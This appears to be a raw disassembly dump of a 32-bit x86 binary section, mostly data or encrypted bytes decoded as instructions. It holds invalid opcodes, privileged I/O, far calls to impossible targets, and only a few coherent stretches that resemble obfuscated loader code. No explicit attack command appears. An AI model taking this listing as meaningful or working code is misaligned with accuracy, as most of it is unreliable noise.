  40204a:	fcmovnu st,st(5)
  40204c:	jp     0x402041
  40204e:	aad    0xf9
  402050:	adc    BYTE PTR [ebp-0x52],ch
  402053:	test   ebp,0x67c64540
  402059:	loope  0x4020cf
  40205b:	pop    edi
  40205c:	add    eax,0x3ad1bcf
  402061:	or     bl,BYTE PTR [edi-0x67c7df11]
  402067:	xor    eax,0x946c4a91
  40206c:	push   edi
  40206d:	hlt    
  40206e:	pop    edx
  40206f:	mov    edx,0xe0558b34
  402074:	mov    DWORD PTR [ebp-0x2c],0x4eb9
  40207b:	mov    DWORD PTR ds:0x42eea4,0x6138
  402085:	cmp    eax,DWORD PTR [edx]
  402087:	mov    DWORD PTR ds:0x42e7da,0x1170
  402091:	je     0x40384c
  402097:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  40209e:	sub    DWORD PTR ds:0x42e7e2,edx
  4020a4:	lea    eax,[ebp-0xc]
  4020a7:	mov    DWORD PTR [ebp-0x10],eax
  4020aa:	sub    edx,eax
  4020ac:	mov    eax,DWORD PTR [ebp-0x10]
  4020af:	not    edx
  4020b1:	jmp    0x402462
  4020b6:	inc    esi
  4020b7:	test   BYTE PTR [edx],bh
  4020b9:	xchg   esp,edi
  4020bb:	mov    ecx,0xed0c457b
  4020c0:	ror    BYTE PTR [esi+0x6ef60d54],1
  4020c6:	into   
  4020c7:	or     al,0x7e
  4020c9:	jle    0x40204d
  4020cb:	jno    0x40214b
  4020cd:	jle    0x4020c9
  4020cf:	mov    ds:0xa2df3eb5,al
  4020d4:	les    ebp,FWORD PTR [esi-0x3c034655]
  4020da:	and    bl,ah
  4020dc:	scas   al,BYTE PTR es:[edi]
  4020dd:	dec    ecx
  4020de:	dec    ecx
  4020df:	mov    ds:0x575d52d5,al
  4020e4:	leave  
  4020e5:	push   0xed3bacd9
  4020ea:	mov    ebp,0x2ee66ae8
  4020ef:	adc    ah,al
  4020f1:	les    ecx,FWORD PTR [esi]
  4020f3:	iret   
  4020f4:	lds    ecx,FWORD PTR [ecx]
  4020f6:	xor    BYTE PTR [esp+edx*1+0x6ddd193a],bh
  4020fd:	xchg   ecx,eax
  4020fe:	iret   
  4020ff:	and    ebx,DWORD PTR [esp+ebx*2-0x50]
  402103:	sti    
  402104:	mov    bh,0xf5
  402106:	push   ds
  402107:	pop    ecx
  402108:	das    
  402109:	or     dh,BYTE PTR [ebp-0x5d9380d3]
  40210f:	sahf   
  402110:	sub    eax,0x908a4441
  402115:	addr16 sbb al,dl
  402118:	mov    BYTE PTR [eax-0x6d],dl
  40211b:	jns    0x40218d
  40211d:	call   0xbd6:0x323472dc
  402124:	enter  0x39f9,0xc6
  402128:	sar    cl,0x1c
  40212b:	hlt    
  40212c:	call   0x82c8:0x7c1c5e46
  402133:	dec    ecx
  402134:	scas   eax,DWORD PTR es:[edi]
  402135:	push   eax
  402136:	xor    edi,DWORD PTR [esi+0x37]
  402139:	adc    bl,BYTE PTR ds:[esp+eax*4]
  40213d:	mov    ecx,0x8b706cd7
  402142:	sbb    eax,0x4711271
  402147:	xlat   BYTE PTR ds:[ebx]
  402148:	sbb    bl,ch
  40214a:	std    
  40214b:	int3   
  40214c:	pushf  
  40214d:	mov    dh,0x58
  40214f:	fstp   QWORD PTR [eax+0x59]
  402152:	jnp    0x4021c0
  402154:	sbb    BYTE PTR [ebx],ah
  402156:	push   ebx
  402157:	jle    0x4021c2
  402159:	faddp  st(0),st
  40215b:	lds    ecx,FWORD PTR ds:0x6fc171
  402161:	bound  edx,QWORD PTR [ecx]
  402163:	lods   eax,DWORD PTR ds:[esi]
  402164:	inc    ecx
  402165:	test   al,0x44
  402167:	and    esp,edi
  402169:	mov    bh,0x9e
  40216c:	ds cmp dl,0x28
  402170:	ror    BYTE PTR ds:0x524d620d,0x18
  402177:	addr16 mov bl,0x53
  40217a:	fiadd  WORD PTR [ebp-0x4329f585]
  402180:	fmul   DWORD PTR ds:0xb9b64f7
  402186:	cmc    
  402187:	mov    BYTE PTR [edi],al
  402189:	dec    esi
  40218a:	dec    ecx
  40218b:	leave  
  40218c:	adc    eax,0x9e08b93
  402191:	xchg   ebx,eax
  402192:	call   0x381313bd
  402197:	xor    DWORD PTR [esi+0x1909dbbc],ecx
  40219d:	jg     0x40219a
  40219f:	mov    eax,ds:0x1849d235
  4021a4:	(bad)  
  4021a5:	cmp    ebx,esp
  4021a7:	sub    BYTE PTR [edx+0x7e],ch
  4021aa:	push   esi
  4021ab:	dec    ecx
  4021ac:	mov    eax,ds:0xe7249590
  4021b1:	mov    ebp,0x1e35ddc4
  4021b6:	sbb    DWORD PTR [edx+0x5c5cefb8],edi
  4021bc:	push   0x4de83d7c
  4021c1:	sbb    al,0x91
  4021c3:	test   eax,0x76d5c6c8
  4021c8:	aam    0x84
  4021ca:	loop   0x402153
  4021cc:	mov    ds:0xef276584,eax
  4021d1:	mov    ecx,0xb1414bc3
  4021d6:	push   0xffffffb6
  4021d8:	jae    0x4021b2
  4021da:	(bad)  
  4021db:	repz ficom DWORD PTR gs:[eax-0x67c477d0]
  4021e3:	inc    edx
  4021e4:	xor    BYTE PTR [ebx],bh
  4021e6:	mov    bh,0x97
  4021e8:	push   es
  4021e9:	sbb    eax,0x209f82bf
  4021ee:	mov    edi,0xc840f630
  4021f3:	daa    
  4021f4:	sub    eax,0xe8075cf2
  4021f9:	push   esp
  4021fa:	std    
  4021fb:	shl    BYTE PTR [esi-0x48],1
  4021fe:	pusha  
  4021ff:	pop    DWORD PTR [ecx-0x35]
  402202:	lods   al,BYTE PTR ds:[esi]
  402203:	lahf   
  402204:	in     al,0x6e
  402206:	cmc    
  402207:	js     0x4021a4
  402209:	jmp    0x40218f
  40220b:	test   eax,0x588be86
  402210:	mov    ds:0x40e13ebd,eax
  402215:	xor    cl,dh
  402217:	pop    ss
  402218:	sub    DWORD PTR [ebp+0x30],eax
  40221b:	dec    edx
  40221c:	rcl    BYTE PTR [ecx+ebx*1],1
  40221f:	dec    edi
  402220:	aad    0xbb
  402222:	push   es
  402223:	jnp    0x4021fb
  402225:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402226:	mov    ecx,DWORD PTR [eax]
  402228:	or     DWORD PTR [eax-0x5fd7799e],esi
  40222e:	test   al,0xa6
  402230:	in     eax,0x8
  402232:	sub    ecx,DWORD PTR [bp+si-0x6e]
  402236:	fsubr  st,st(4)
  402238:	retf   0x97f0
  40223b:	xor    eax,0xdb2cfe8d
  402240:	(bad)  
  402241:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402243:	sbb    BYTE PTR [ecx+0x341ae08a],dh
  402249:	data16 jnp 0x4021f7
  40224c:	repnz sbb BYTE PTR [ebx],ah
  40224f:	int    0x37
  402251:	xchg   edx,eax
  402252:	cdq    
  402253:	stos   BYTE PTR es:[edi],al
  402254:	repz push edx
  402256:	jle    0x402210
  402258:	test   al,0x91
  40225a:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40225c:	cld    
  40225d:	xor    DWORD PTR [eax+0x1bd4b22b],ebp
  402263:	out    dx,eax
  402264:	and    eax,0xaedee71e
  402269:	mov    ebp,0xc585a820
  40226e:	retf   0xaa87
  402271:	cmp    DWORD PTR [ecx-0x49],edi
  402274:	mov    al,0x6d
  402276:	xchg   edi,ebp
  402278:	clc    
  402279:	adc    al,0x4a
  40227b:	adc    BYTE PTR [ecx-0x79],bh
  40227e:	mov    BYTE PTR [eax+0x4d],dh
  402281:	popa   
  402282:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402283:	sub    al,0xe3
  402285:	jg     0x402236
  402287:	mov    eax,0xb20b70be
  40228c:	out    0x84,al
  40228e:	jmp    0x97f5bb88
  402293:	es xchg esp,eax
  402295:	pop    esp
  402296:	cmc    
  402297:	cmp    BYTE PTR [ebx],ah
  402299:	sub    eax,0x6c817c2e
  40229e:	es cdq 
  4022a0:	push   ss
  4022a1:	jbe    0x402267
  4022a3:	fs aaa 
  4022a5:	mov    ebp,DWORD PTR [eax-0x1f]
  4022a8:	(bad)  
  4022a9:	xor    dh,BYTE PTR [ebx+ebx*1-0x66a47f26]
  4022b0:	push   ebp
  4022b1:	xor    eax,DWORD PTR [ecx]
  4022b3:	add    eax,0x55df25e2
  4022b8:	aad    0x5b
  4022ba:	jge    0x40225a
  4022bc:	nop
  4022bd:	cwde   
  4022be:	inc    ecx
  4022bf:	je     0x4022e3
  4022c1:	add    BYTE PTR [esi+ecx*8],dh
  4022c4:	mov    es,WORD PTR [edx]
  4022c6:	fsubrp st(0),st
  4022c8:	and    al,0xe
  4022ca:	pop    ss
  4022cb:	push   ds
  4022cc:	popa   
  4022cd:	inc    ebx
  4022ce:	cmp    BYTE PTR [ebx-0x26],bl
  4022d1:	ret    0x50db
  4022d4:	jl     0x4022a6
  4022d6:	mov    dh,0x91
  4022d8:	out    dx,al
  4022d9:	xchg   esi,eax
  4022da:	sub    eax,0x667c1cc1
  4022df:	popf   
  4022e0:	and    bl,BYTE PTR [esi-0x75]
  4022e3:	outs   dx,DWORD PTR ds:[esi]
  4022e4:	fldl2t 
  4022e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4022e7:	cmc    
  4022e8:	xchg   esp,eax
  4022e9:	fcomp  DWORD PTR [eax]
  4022eb:	imul   ebp,esi,0xffffffed
  4022ee:	ret    0x2c34
  4022f1:	loopne 0x40233e
  4022f3:	cwde   
  4022f4:	mov    esi,0x7db6c0ae
  4022f9:	pop    ebp
  4022fa:	repz iret 
  4022fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4022fd:	sbb    ebp,DWORD PTR [ebx]
  4022ff:	push   ss
  402300:	out    0xe3,eax
  402302:	das    
  402303:	bound  eax,QWORD PTR [ebx+edi*4-0x4038a223]
  40230a:	loopne 0x402340
  40230c:	retf   0xce36
  40230f:	cwde   
  402310:	imul   esi,edx,0xffffffb0
  402313:	and    BYTE PTR [ebx+0x61],ah
  402316:	dec    edx
  402317:	in     eax,dx
  402318:	and    al,0xec
  40231a:	fwait
  40231b:	pushf  
  40231c:	xchg   ebx,eax
  40231d:	cmp    ah,BYTE PTR [edx]
  40231f:	jns    0x40234f
  402321:	push   edi
  402322:	out    0xb6,eax
  402324:	xchg   esi,eax
  402325:	rol    BYTE PTR [edx-0x608df6a6],1
  40232b:	repz std 
  40232d:	call   0x5a9c:0x69dcc99f
  402334:	sub    BYTE PTR [esi*4+0x5bb4cbab],ch
  40233b:	retf   0x9f35
  40233e:	outs   dx,BYTE PTR ds:[esi]
  40233f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402340:	loope  0x402360
  402342:	std    
  402343:	push   eax
  402344:	or     eax,DWORD PTR [bx+di]
  402347:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402348:	mov    dl,0xf3
  40234a:	cmp    eax,0xfeda5545
  40234f:	xor    ebx,DWORD PTR es:[edx+esi*2-0x281d9666]
  402357:	into   
  402358:	inc    esi
  402359:	mov    al,ds:0xd10ed913
  40235e:	xor    al,0x1c
  402360:	jbe    0x40238f
  402362:	push   esp
  402363:	sbb    BYTE PTR [esi+edi*1+0x27],ah
  402367:	mov    al,0x35
  402369:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40236a:	jnp    0x4023a1
  40236c:	fld    DWORD PTR [esi-0x25]
  40236f:	pop    eax
  402370:	sbb    al,0x8c
  402372:	mov    eax,0x1097e109
  402377:	int3   
  402378:	pop    ecx
  402379:	js     0x402370
  40237b:	pop    esi
  40237c:	aad    0x39
  40237e:	push   ebx
  40237f:	mov    ebx,0x43d2f452
  402384:	inc    esp
  402385:	or     eax,0xe894edd8
  40238a:	xchg   edi,eax
  40238b:	push   cs
  40238c:	sbb    al,0xc6
  40238e:	ror    DWORD PTR [esi],0x91
  402391:	lock push esp
  402393:	or     eax,DWORD PTR [eax]
  402395:	xor    al,0x72
  402397:	or     eax,0xeafce4f3
  40239c:	adc    BYTE PTR [esi-0xc],0x37
  4023a0:	scas   eax,DWORD PTR es:[edi]
  4023a1:	fmul   DWORD PTR [ebx]
  4023a3:	(bad)  
  4023a4:	(bad)  [edx]
  4023a6:	inc    edi
  4023a7:	js     0x4023fe
  4023a9:	retf   0x9305
  4023ac:	cmp    ah,bh
  4023ae:	imul   esp,DWORD PTR [ebx-0x259c4a8a],0xffffffee
  4023b5:	lods   al,BYTE PTR ds:[esi]
  4023b6:	mov    DWORD PTR [ebx-0x5ba52f58],esi
  4023bc:	pop    ss
  4023bd:	jae    0x40237d
  4023bf:	stos   DWORD PTR es:[edi],eax
  4023c0:	mov    ebx,0xcaa6bb67
  4023c5:	shr    BYTE PTR [esi],0xb2
  4023c8:	paddusb mm6,QWORD PTR [edx-0x7e]
  4023cc:	mov    cl,0x52
  4023ce:	pop    esp
  4023cf:	dec    ebx
  4023d0:	push   ss
  4023d1:	cdq    
  4023d2:	(bad)  
  4023d4:	add    BYTE PTR [eax],cl
  4023d6:	push   ecx
  4023d7:	loop   0x4023bc
  4023d9:	add    eax,0x2a4aaf5d
  4023de:	adc    cl,BYTE PTR [edi+esi*4+0x51]
  4023e2:	pop    edi
  4023e3:	stos   BYTE PTR es:[edi],al
  4023e4:	sbb    esi,DWORD PTR [eax-0xe]
  4023e7:	sbb    ecx,DWORD PTR ds:0x37252522
  4023ed:	inc    esp
  4023ee:	adc    BYTE PTR [ecx+0x12c55a92],0x1
  4023f5:	cmp    ah,BYTE PTR ds:0xbea82b08
  4023fb:	aam    0x92
  4023fd:	sahf   
  4023fe:	xor    BYTE PTR cs:[edi+0x1b],ch
  402402:	jl     0x40241e
  402404:	jae    0x402432
  402406:	mov    ?,WORD PTR [ebp-0xc]
  402409:	sub    ebp,ebx
  40240b:	ret    0x5197
  40240e:	mov    ebx,0xc71fe2d2
  402413:	ins    BYTE PTR es:[edi],dx
  402414:	mov    edx,?
  402416:	jbe    0x4023fa
  402418:	xor    bl,bh
  40241a:	jmp    0x215c9b6
  40241f:	test   BYTE PTR [ebx+0x10],cl
  402422:	mov    edi,0x48bb4598
  402427:	xor    edi,eax
  402429:	xchg   ecx,edi
  40242b:	arpl   WORD PTR [edx+0x39],ax
  40242e:	jmp    0x402435
  402430:	das    
  402431:	sub    cl,BYTE PTR [ecx+0xc82d6db]
  402437:	adc    DWORD PTR [ebx+eiz*1+0x5a],ecx
  40243b:	rol    ebp,1
  40243d:	sbb    BYTE PTR ds:0xdf4db4e0,al
  402443:	cdq    
  402444:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402445:	sub    eax,0x41806197
  40244a:	test   eax,0xcb90adab
  40244f:	rol    BYTE PTR [edx+ecx*2+0x24],0x3
  402454:	int3   
  402455:	mov    al,0xea
  402457:	adc    al,0x65
  402459:	or     eax,0x3774f0ba
  40245e:	xchg   edx,eax
  40245f:	mov    dl,0x9b
  402461:	mov    ds:0xd269108b,eax
  402466:	out    dx,al
  402467:	test   eax,0x5c7f89e
  40246c:	mov    BYTE PTR ds:0x79640043,0x0
  402473:	add    BYTE PTR [ecx+0x3e05c710],cl
  402479:	add    eax,0x76460043
  40247e:	add    BYTE PTR [eax],al
  402480:	mov    eax,DWORD PTR [ebp-0xc]
  402483:	cmp    eax,0x823721f2
  402488:	mov    DWORD PTR ds:0x43053a,0x4bbf
  402492:	je     0x4028be
  402498:	and    ebx,0x6650
  40249e:	mov    eax,DWORD PTR [ebp-0x1c]
  4024a1:	jmp    0x402852
  4024a6:	inc    esi
  4024a7:	xchg   DWORD PTR [ecx],esp
  4024a9:	jmp    0x50e0:0xbb5d6ce1
  4024b0:	dec    eax
  4024b1:	xchg   ecx,eax
  4024b2:	aam    0x80
  4024b4:	aam    0x39
  4024b6:	push   edx
  4024b7:	movd   DWORD PTR [esi-0x7e],mm7
  4024bb:	jno    0x40253b
  4024bd:	jle    0x402471
  4024bf:	xor    eax,0x7b81fec1
  4024c4:	pop    eax
  4024c5:	fs shr dl,1
  4024c8:	int    0x2b
  4024ca:	jno    0x4024ea
  4024cc:	outs   dx,DWORD PTR ds:[esi]
  4024cd:	xlat   BYTE PTR ds:[ebx]
  4024ce:	pop    es
  4024cf:	xor    al,0x92
  4024d1:	xchg   ebx,eax
  4024d2:	outs   dx,BYTE PTR ds:[esi]
  4024d3:	adc    cl,cl
  4024d5:	mov    ds:0xca8f375c,al
  4024da:	scas   eax,DWORD PTR es:[edi]
  4024db:	mov    esp,0x90132625
  4024e0:	rcr    bh,1
  4024e2:	adc    dl,bh
  4024e4:	pusha  
  4024e5:	stc    
  4024e6:	jmp    0xda475d84
  4024eb:	and    al,0x41
  4024ed:	fbstp  TBYTE PTR cs:[edi-0x224dcf12]
  4024f4:	pop    ecx
  4024f5:	jmp    0x4024a7
  4024f7:	test   BYTE PTR [eax-0x1e],0x57
  4024fb:	call   0xa6ab4aaf
  402500:	cmp    eax,0x8e4fe894
  402505:	dec    ebp
  402506:	push   0x11
  402508:	stos   DWORD PTR es:[edi],eax
  402509:	repnz sti 
  40250b:	dec    esi
  40250c:	dec    ebx
  40250d:	xor    DWORD PTR [ecx+0x49e21847],ebx
  402513:	(bad)
  402517:	leave  
  402518:	retf   
  402519:	jo     0x402572
  40251b:	lahf   
  40251c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40251d:	out    dx,al
  40251e:	or     dl,cl
  402520:	sbb    DWORD PTR [esi+0x31dc7be],esp
  402526:	call   0x4de:0x47c21404
  40252d:	adc    eax,0x8c441bb
  402532:	adc    bh,ch
  402534:	xor    bl,BYTE PTR [ebp-0x6896d038]
  40253a:	cmp    DWORD PTR [esi+ebp*2],ebp
  40253d:	pop    eax
  40253e:	outs   dx,BYTE PTR ds:[esi]
  40253f:	or     al,0x4a
  402541:	(bad)  
  402542:	inc    edi
  402543:	push   0x207a2fcf
  402548:	jmp    0x189b1a12
  40254d:	adc    ch,dh
  40254f:	ins    DWORD PTR es:[edi],dx
  402550:	neg    BYTE PTR [eax-0x7592e3fe]
  402556:	xor    ebp,edi
  402558:	jg     0x40256c
  40255a:	jl     0x402512
  40255c:	mov    bl,BYTE PTR [ebx-0x474f2706]
  402562:	mov    ebp,0x1cfb2001
  402567:	inc    edi
  402568:	mov    DWORD PTR [edx-0x531a6fb5],ebp
  40256e:	mov    BYTE PTR [eax+0x23],al
  402571:	jmp    0x4025e1
  402573:	xor    eax,0x1821e2a
  402578:	inc    eax
  402579:	aam    0x40
  40257b:	and    eax,0xc959d60b
  402580:	imul   ecx,DWORD PTR [ebx+0x63],0xfffffff1
  402584:	test   DWORD PTR [esp+ecx*1+0x2a3e48b8],eax
  40258b:	sub    ebx,DWORD PTR [eax+0x3cfd33c7]
  402591:	sbb    ebp,ebp
  402593:	push   edx
  402594:	cmp    al,0x92
  402596:	pop    ss
  402597:	add    ch,BYTE PTR [edx+0x4614740f]
  40259d:	push   ds
  40259e:	in     al,0xea
  4025a0:	es dec eax
  4025a2:	test   DWORD PTR [edi],edx
  4025a4:	fld    QWORD PTR [edi]
  4025a6:	xor    DWORD PTR [eax-0x4ad8c832],0xbdf3f1c8
  4025b0:	mov    DWORD PTR [ecx],ecx
  4025b2:	in     eax,dx
  4025b3:	jl     0x40257d
  4025b5:	ret    0x5de2
  4025b8:	mov    esp,0xe73587fb
  4025bd:	into   
  4025be:	test   cl,dh
  4025c0:	adc    BYTE PTR [eax-0x42],bh
  4025c3:	repz test cl,bl
  4025c6:	push   eax
  4025c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025c8:	fwait
  4025c9:	inc    edi
  4025ca:	(bad)  
  4025cc:	sub    dl,dh
  4025ce:	sti    
  4025cf:	dec    ebp
  4025d0:	push   0x44
  4025d2:	shr    BYTE PTR ds:0x1dc5eb4d,cl
  4025d8:	imul   edi,DWORD PTR [esi],0xe
  4025db:	and    cl,cl
  4025dd:	sbb    DWORD PTR [edx-0x45],edx
  4025e0:	adc    ebp,eax
  4025e2:	add    bl,ah
  4025e4:	es jge 0x402615
  4025e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025e8:	jno    0x402582
  4025ea:	fxch   st(7)
  4025ec:	push   ds
  4025ed:	mov    cs,WORD PTR [edx+0x47]
  4025f0:	mov    bl,0xe9
  4025f2:	mov    cl,BYTE PTR [edi]
  4025f4:	xchg   DWORD PTR [edi],ebp
  4025f6:	repnz cmp al,0x15
  4025f9:	xor    dl,BYTE PTR [eax]
  4025fb:	dec    ebx
  4025fc:	ror    BYTE PTR [ecx-0x31],1
  4025ff:	je     0x402592
  402601:	outs   dx,DWORD PTR ds:[esi]
  402602:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402603:	and    al,0x15
  402605:	andnps xmm5,XMMWORD PTR [edx+0x14f2dd2c]
  40260c:	jmp    0xc262c355
  402611:	popf   
  402612:	push   esp
  402613:	add    BYTE PTR [esi],ah
  402615:	dec    ecx
  402616:	nop
  402617:	inc    ebx
  402618:	mov    ch,0xbb
  40261a:	and    BYTE PTR [eax+0x4f65843c],al
  402620:	out    dx,al
  402621:	dec    edi
  402622:	int    0xa3
  402624:	jecxz  0x4025a6
  402626:	imul   esi,DWORD PTR [eax],0xa
  402629:	aas    
  40262a:	leave  
  40262b:	push   0x28
  40262d:	mov    al,ds:0x74389ec1
  402632:	iret   
  402633:	cmp    ch,BYTE PTR [ecx]
  402635:	push   ecx
  402636:	push   ecx
  402637:	mul    BYTE PTR [ebp+0x21]
  40263a:	mov    eax,0xb4b87136
  40263f:	mov    bl,0x80
  402641:	mov    al,0x5c
  402643:	add    al,0xae
  402645:	leave  
  402646:	xchg   ecx,eax
  402647:	comiss xmm5,DWORD PTR [ecx+esi*8+0x21]
  40264c:	(bad)  
  40264d:	repz push ebp
  40264f:	add    eax,0x4b4e2e1e
  402654:	inc    edx
  402655:	sbb    DWORD PTR [eax-0x32],edi
  402658:	mov    esi,0x62f81a34
  40265d:	rcl    BYTE PTR [edx+eiz*8],1
  402660:	inc    edx
  402661:	loop   0x4026c7
  402663:	mov    ecx,ebp
  402665:	jg     0x40267b
  402667:	xor    al,0x3
  402669:	std    
  40266a:	hlt    
  40266b:	loopne 0x4026c9
  40266d:	or     esp,DWORD PTR [eax+0x5d]
  402670:	pop    es
  402671:	push   esi
  402672:	jp     0x402618
  402674:	aam    0x5f
  402676:	inc    esi
  402677:	rcr    DWORD PTR [eax],0x16
  40267a:	add    dl,ch
  40267c:	inc    eax
  40267d:	mov    eax,0x4f8921c2
  402682:	and    ebx,esi
  402684:	cwde   
  402685:	or     DWORD PTR [edx+0x1eed293f],edi
  40268b:	in     eax,dx
  40268c:	div    DWORD PTR [ebp+0x16]
  40268f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402690:	jb     0x40270e
  402692:	rol    DWORD PTR [eax],0x4
  402695:	(bad)  
  402696:	jae    0x402686
  402698:	push   cs
  402699:	call   0x1bddef69
  40269e:	mov    bh,0xee
  4026a0:	mov    eax,ds:0xc7d297e3
  4026a5:	(bad)  [esi]
  4026a7:	enter  0xe374,0x8e
  4026ab:	and    bl,bh
  4026ad:	and    bl,ch
  4026af:	in     eax,0xd0
  4026b1:	fsub   DWORD PTR ds:0xe972fe13
  4026b7:	dec    edi
  4026b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4026b9:	cmp    BYTE PTR [eax+edi*1-0x3ce0c9b2],bh
  4026c0:	jecxz  0x4026f8
  4026c2:	or     esp,ebx
  4026c4:	push   edi
  4026c5:	loopne 0x4026c4
  4026c7:	cmp    al,BYTE PTR [edi+0x3e]
  4026ca:	push   0xebef930
  4026cf:	push   cs
  4026d0:	popa   
  4026d1:	dec    ebx
  4026d2:	sbb    dh,BYTE PTR [ebx-0x4d]
  4026d5:	add    BYTE PTR [ebp+0x28e21f2f],ch
  4026db:	dec    edx
  4026dc:	ret    0x18e9
  4026df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4026e0:	data16 sti 
  4026e2:	mov    ebp,0x6324d724
  4026e7:	loop   0x4026ce
  4026e9:	jnp    0x4026d1
  4026eb:	jge    0x402699
  4026ed:	and    edi,DWORD PTR [eax+edx*1+0x72]
  4026f1:	pop    ebx
  4026f2:	mov    bl,0x16
  4026f4:	fsub   st(5),st
  4026f6:	xchg   esi,eax
  4026f7:	xchg   edi,eax
  4026f8:	iret   
  4026f9:	xchg   dl,dl
  4026fb:	mov    ah,cl
  4026fd:	lea    ecx,[ebx]
  4026ff:	rcr    DWORD PTR [eax+0x64c02b14],cl
  402705:	and    al,0xf9
  402707:	outs   dx,BYTE PTR ds:[esi]
  402708:	sub    BYTE PTR [edi+eiz*2-0x7f80761a],bl
  40270f:	cmp    eax,0xf01a3780
  402714:	push   0x3a5aba42
  402719:	cdq    
  40271a:	cmc    
  40271b:	scas   al,BYTE PTR es:[edi]
  40271c:	(bad)  
  40271d:	iret   
  40271e:	lods   eax,DWORD PTR ds:[esi]
  402720:	shr    BYTE PTR [esi-0x6575fd5a],1
  402726:	icebp  
  402727:	loop   0x4026f0
  402729:	stos   BYTE PTR es:[edi],al
  40272a:	in     al,dx
  40272b:	push   ecx
  40272c:	xor    eax,0xedab696b
  402731:	iret   
  402732:	icebp  
  402733:	mov    WORD PTR [eax],ss
  402735:	mov    al,0xaf
  402737:	adc    ebx,DWORD PTR [edi+esi*4+0x682458fa]
  40273e:	mov    bl,0x71
  402740:	fsub   QWORD PTR [eax]
  402742:	mov    eax,ds:0x51c62591
  402747:	jne    0x4027c8
  402749:	mov    ecx,0x60dee968
  40274e:	je     0x402775
  402750:	mov    cl,0x10
  402752:	mov    ebp,0xe68c5fcb
  402757:	mov    eax,DWORD PTR [edx+0x1ead3589]
  40275d:	mov    bh,0xa3
  40275f:	inc    esi
  402760:	std    
  402761:	pop    ds
  402762:	(bad)
  402766:	mov    bl,0xd4
  402768:	add    bl,BYTE PTR [ebx-0x6f387444]
  40276e:	sub    bl,cl
  402770:	adc    eax,0xa0466c0b
  402775:	adc    cl,dh
  402777:	push   eax
  402778:	add    DWORD PTR ss:[esi+0x6f],ebp
  40277c:	add    al,0xd0
  40277e:	mov    bh,0x9b
  402780:	fst    DWORD PTR [esi-0x18]
  402783:	(bad)  
  402784:	mov    cl,0xa2
  402786:	or     ch,BYTE PTR [ecx]
  402788:	xchg   ebx,eax
  402789:	stos   DWORD PTR es:[edi],eax
  40278a:	and    eax,0xb2fd2eb4
  40278f:	jecxz  0x4027e7
  402791:	and    eax,0x88fa3dc8
  402796:	dec    ebp
  402797:	call   0x9e9cd83b
  40279c:	inc    ecx
  40279d:	cmp    DWORD PTR [ebp+eax*2+0x5969ceec],ecx
  4027a4:	mov    al,ds:0x2bba35ba
  4027a9:	cwde   
  4027aa:	test   eax,0x7100f906
  4027af:	adc    eax,0xd91fbd9c
  4027b4:	inc    ecx
  4027b5:	dec    edx
  4027b6:	sbb    eax,0xcfcc67e1
  4027bb:	int    0x35
  4027bd:	popf   
  4027be:	add    BYTE PTR [ebp-0x7be0f501],cl
  4027c4:	push   ebx
  4027c5:	nop
  4027c6:	(bad)  
  4027c7:	inc    BYTE PTR [ebx+0x181cad91]
  4027cd:	stos   DWORD PTR es:[edi],eax
  4027ce:	into   
  4027cf:	mov    al,0x6
  4027d1:	mov    ds:0xd6332a3f,eax
  4027d6:	mov    bh,0x2a
  4027d8:	mov    DWORD PTR [ecx],edi
  4027da:	jmp    0x40284e
  4027dc:	xchg   DWORD PTR [ebp-0x26],edx
  4027df:	dec    ebx
  4027e0:	dec    edx
  4027e1:	push   0x99d1e50b
  4027e6:	lds    esi,FWORD PTR [edx]
  4027e8:	lock dec edi
  4027ea:	or     eax,0x93c25809
  4027ef:	jne    0x4027d1
  4027f1:	imul   ebx,DWORD PTR [ecx],0xffffff93
  4027f4:	les    ebx,FWORD PTR [edx]
  4027f6:	cwde   
  4027f7:	pop    ecx
  4027f8:	cmp    eax,0x2d4483a8
  4027fd:	sub    al,0x71
  4027ff:	adc    al,0x74
  402801:	xchg   BYTE PTR [ebx],bh
  402803:	or     BYTE PTR gs:[ebx-0x41],ch
  402807:	push   esp
  402808:	jbe    0x4027ec
  40280a:	or     ah,BYTE PTR [esi-0x1770aba3]
  402810:	popf   
  402811:	jbe    0x4027d9
  402813:	xor    eax,0x9edbe74
  402818:	jle    0x402846
  40281a:	xchg   esi,eax
  40281b:	adc    BYTE PTR [ebp+0x43],dl
  40281e:	aaa    
  40281f:	jmp    0x40280b
  402821:	sub    BYTE PTR [ebx+0x161f738b],0xa0
  402828:	mov    dl,0x8
  40282a:	sbb    DWORD PTR [ebx],ebx
  40282c:	loop   0x4027d8
  40282e:	shr    ebp,0xd9
  402831:	inc    edi
  402832:	(bad)  [ebp-0x75d5b995]
  402838:	into   
  402839:	retf   
  40283a:	cwde   
  40283b:	test   BYTE PTR [edx+0x16],0x2e
  40283f:	outs   dx,DWORD PTR ds:[esi]
  402840:	ret    
  402841:	mov    edi,0x812ed497
  402846:	mov    BYTE PTR [edi+eiz*8+0x6e],bh
  40284a:	sbb    ah,BYTE PTR [edx-0x75]
  40284d:	push   esi
  40284e:	bound  ecx,QWORD PTR [edi-0x6f]
  402851:	xchg   edx,eax
  402852:	or     DWORD PTR [eax],0x60751c9e
  402858:	mov    DWORD PTR ds:0x42e7de,0x14
  402862:	cmp    DWORD PTR ds:0x42e7de,0x0
  402869:	je     0x4028b0
  40286f:	cmp    DWORD PTR ds:0x42e7de,0x6
  402876:	jne    0x402885
  40287c:	push   DWORD PTR [ebp-0xc]
  40287f:	call   DWORD PTR ds:0x42ea58
  402885:	cmp    DWORD PTR ds:0x42e7de,0x7
  40288c:	jne    0x4028a0
  402892:	xor    eax,eax
